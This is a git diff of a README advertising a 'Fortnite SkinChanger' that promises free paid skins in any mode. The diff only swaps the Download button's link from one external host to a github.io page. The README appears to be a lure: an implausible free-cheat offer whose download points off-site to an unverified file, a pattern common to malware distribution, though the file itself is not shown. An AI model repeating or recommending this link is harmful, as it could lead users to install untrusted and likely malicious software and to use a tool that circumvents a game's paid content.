@@ -4,7 +4,7 @@ Ever wanted Renegade Raider, Galaxy, or Travis Scott but weren’t around (or ju
 
 No need for real cash, battle pass grinding, or item shop luck. Just load it up, pick your skin, and **show off in any mode** – even creative and zero build 🔥
 
-[![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://Fortnite-Skinchanger-ga1.github.io/.github)
 ---
 
 ## 🎮 What Is a Fortnite Skinchanger?
